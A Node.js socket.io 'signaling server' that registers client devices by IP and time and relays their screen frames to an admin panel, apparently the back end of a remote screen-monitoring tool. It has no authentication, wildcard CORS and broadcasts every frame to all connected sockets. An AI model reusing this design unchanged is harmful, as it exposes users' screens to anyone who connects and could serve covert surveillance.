const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*"
    }
});

const devices = new Map();

io.on('connection', (socket) => {
    const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    const connectTime = new Date().toLocaleString();

    // Agar device client hai
    socket.on('register_device', (data) => {
        devices.set(socket.id, { id: socket.id, ip: clientIp, time: connectTime, type: 'client' });
        io.emit('update_list', Array.from(devices.values()));
    });

    // Screen stream frames relay karna admin ko
    socket.on('screen_frame', (data) => {
        io.emit('broadcast_screen', { id: socket.id, frame: data });
    });

    // Admin panel connection
    socket.on('register_admin', () => {
        socket.emit('update_list', Array.from(devices.values()));
    });

    socket.on('disconnect', () => {
        devices.delete(socket.id);
        io.emit('update_list', Array.from(devices.values()));
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`[*] Signaling server running on port ${PORT}`);
});
